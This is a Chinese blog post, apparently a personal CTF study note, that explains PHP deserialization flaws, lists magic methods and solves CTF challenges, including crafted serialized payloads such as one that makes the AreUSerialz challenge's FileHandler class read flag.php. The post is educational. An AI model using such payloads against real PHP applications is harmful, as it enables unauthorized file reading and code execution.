@@ -1,0 +1,276 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>关于php反序列化漏洞的一些总结 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="原理序列化就是，所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">关于php反序列化漏洞的一些总结</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">关于php反序列化漏洞的一些总结</h1>
+        <div class="stuff">
+            <span>八月 21, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag">反序列化漏洞</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>序列化就是，所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 –php官方文档</strong></p>
+<h4 id="序列化代码执行效果"><a href="#序列化代码执行效果" class="headerlink" title="序列化代码执行效果"></a>序列化代码执行效果</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Ctf&quot;</span>:<span class="number">3</span>&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">15</span>:<span class="string">&quot;flag&#123;xiaofeiji&#125;&quot;</span>;s:<span class="number">4</span><span class="string">&quot;name&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaofeiji&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;19&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>三个属性：flag name age</p>
+<p>O表示对象，如果要序列化数组，则用A；</p>
+<p>3 表示类名的长度</p>
+<p>Ctf表示类名</p>
+<p>3表示三个属性</p>
+<p>s表示字符串</p>
+<p>4表示属性的长度</p>
+<p>flag属性的名字</p>
+<p>s:15:”flag{xiaofeiji} 字符串 属性值长度  属性值</p>
+<p><strong>执行代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctf</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;xiaofeiji&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;xiaofeiji&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;19&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Ctf();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="反序列化代码执行效果"><a href="#反序列化代码执行效果" class="headerlink" title="反序列化代码执行效果"></a>反序列化代码执行效果</h4><p>将序列化化结果O:3:”Ctf”:3{s:4:”flag”;s:15:”flag{xiaofeiji}”;s:4”name”;s:9:”xiaofeiji”;s:3:”age”;s:2:”19”;}还原为对象：</p>
+<p><img src="1.png"></p>
+<p><img src="2.png"></p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>PHP反序列化的过程中，如果未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，则会导致代码</p>
+<p>执行，SQL 注入，目录遍历等不可控后果。</p>
+<h3 id="反序列化分类"><a href="#反序列化分类" class="headerlink" title="反序列化分类"></a>反序列化分类</h3><h4 id="无类"><a href="#无类" class="headerlink" title="无类"></a>无类</h4><h5 id="本地测试情况"><a href="#本地测试情况" class="headerlink" title="本地测试情况"></a>本地测试情况</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;xiaodi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unserialize(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过传入xiaodi序列化后的字符串，使得反序列化后的结果等于xiaodi，从而输出flag.php的内容。</p>
+<p><img src="3.png"></p>
+<p>因此传入str=s:6:”xiaodi” 即可。</p>
+<h5 id="bugku-flag-php题目"><a href="#bugku-flag-php题目" class="headerlink" title="bugku -flag.php题目"></a>bugku -flag.php题目</h5><p><img src="4.png"></p>
+<ol>
+<li>bugku上找不着题目了，找一张别人的图分析一下源码：</li>
+</ol>
+<p>存在unserialize()，属于无类的反序列化，如果接收到的cookie值经过反序列化后的结果等于$KEY的话，就会输出flag。</p>
+<ol start="2">
+<li>这个题目有两个注意点：</li>
+</ol>
+<p> if判断语句，如果刚开始给hint赋值的话，按照代码的执行顺序，则会跳过elseif判断我们的关键代码，因此不需要对hint传值；</p>
+<p>按照代码的执行顺序，cookie与$KEY的判断在对key赋值之前就已经进行了输出，因此在判断的时候key的值其实为空，而非后面的参数值，因此cookie处传入的值应该为：s:0:””</p>
+<p><img src="5.png"></p>
+<h4 id="有类"><a href="#有类" class="headerlink" title="有类"></a>有类</h4><h5 id="主要是涉及到一些魔术函数的用法："><a href="#主要是涉及到一些魔术函数的用法：" class="headerlink" title="主要是涉及到一些魔术函数的用法："></a>主要是涉及到一些魔术函数的用法：</h5><p>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
+<p>__construct()//创建对象时触发</p>
+<p>__destruct() //对象被销毁时触发</p>
+<p>__call() //在对象上下文中调用不可访问的方法时触发</p>
+<p>__callStatic() //在静态上下文中调用不可访问的方法时触发</p>
+<p>__get() //用于从不可访问的属性读取数据</p>
+<p>__set() //用于将数据写入不可访问的属性</p>
+<p>__isset() //在不可访问的属性上调用 isset()或 empty()触发</p>
+<p>__unset() //在不可访问的属性上使用 unset()时触发</p>
+<p>__invoke() //当脚本尝试将对象调用为函数时触发</p>
+<p>__toString()//当一个类被当做字符串使用时或者存在echo等传统输出函数（自动把类当做字符串使用）时触发</p>
+<p>1.构造函数和析构函数的使用：</p>
+<p><img src="6.png"></p>
+<p>__construct()创建对象时触发,$a=new ABC()，</p>
+<p>__wakeup()在执行serialize()函数时触发；</p>
+<p>__destruct()在对象被摧毁时触发。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kuboy/p/7747148.html%EF%BC%88%E5%85%B3%E4%BA%8E%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%92%8C%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%87%E7%AB%A0%E6%8E%A8%E8%8D%90%EF%BC%89">https://www.cnblogs.com/kuboy/p/7747148.html（关于构造函数和析构函数的文章推荐）</a></p>
+<h5 id="一道ctfhub上的题目：AreUSerialz"><a href="#一道ctfhub上的题目：AreUSerialz" class="headerlink" title="一道ctfhub上的题目：AreUSerialz"></a>一道ctfhub上的题目：AreUSerialz</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;process();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">$this</span>-&gt;write();</span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​      <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line"></span><br><span class="line">​      <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;process();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line"></span><br><span class="line">​    <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>分析题目源码：首先关注到unserialize()函数，发现有类，属于有类的反序列化：</strong></p>
+<ol>
+<li><p>process()方法中：如果op的值弱比较为1，则执行write方法；若op弱比较的值为2，则执行read方法。由于我们需要读取到flag.php文件，因此我们期望程序执行到read()方法。</p>
+</li>
+<li><p>在__destruct()方法中，如果op的强比较等于2的话，op就会被强制转换为1，并进入process()方法继续进行write()和read()的判断。</p>
+</li>
+<li><p>因此，可以总结出一个解题思路为：op需要一个弱比较等于2但是强比较不等于2的值，传入的op为2中，我们构造一个空格2，就能绕过强弱比较的两种判断。将最后读取的filename用flag.php覆盖即可。</p>
+</li>
+</ol>
+<p><strong>因此开始构造序列化的值：</strong></p>
+<p><img src="7.png"></p>
+<ul>
+<li><p>is_valid 函数还对序列化字符串进行了校验，因为一开始忽略了protected权限的变量在序列化时会有%00*%00字符，其中%00的ASCII码值为0，不在is_valid函数规定的32到125的范围内，导致无法输出结果。</p>
+</li>
+<li><p>因为成员被 protected 修饰，因此序列化字符串中会出现 ascii 为 0 的字符。查看wp时发现，在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p>
+</li>
+<li><p>因此使用public代替protected即可：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> FileHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="8.png"></p>
+<p>题目思路不难，需要注意到条件判断，以及属性的序列化产生结果等问题。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.</span> <span class="toc-text">序列化代码执行效果</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C"><span class="toc-number">1.2.</span> <span class="toc-text">反序列化代码执行效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text">反序列化分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E7%B1%BB"><span class="toc-number">3.1.</span> <span class="toc-text">无类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95%E6%83%85%E5%86%B5"><span class="toc-number">3.1.1.</span> <span class="toc-text">本地测试情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bugku-flag-php%E9%A2%98%E7%9B%AE"><span class="toc-number">3.1.2.</span> <span class="toc-text">bugku -flag.php题目</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E7%B1%BB"><span class="toc-number">3.2.</span> <span class="toc-text">有类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E6%98%AF%E6%B6%89%E5%8F%8A%E5%88%B0%E4%B8%80%E4%BA%9B%E9%AD%94%E6%9C%AF%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95%EF%BC%9A"><span class="toc-number">3.2.1.</span> <span class="toc-text">主要是涉及到一些魔术函数的用法：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E9%81%93ctfhub%E4%B8%8A%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%9AAreUSerialz"><span class="toc-number">3.2.2.</span> <span class="toc-text">一道ctfhub上的题目：AreUSerialz</span></a></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
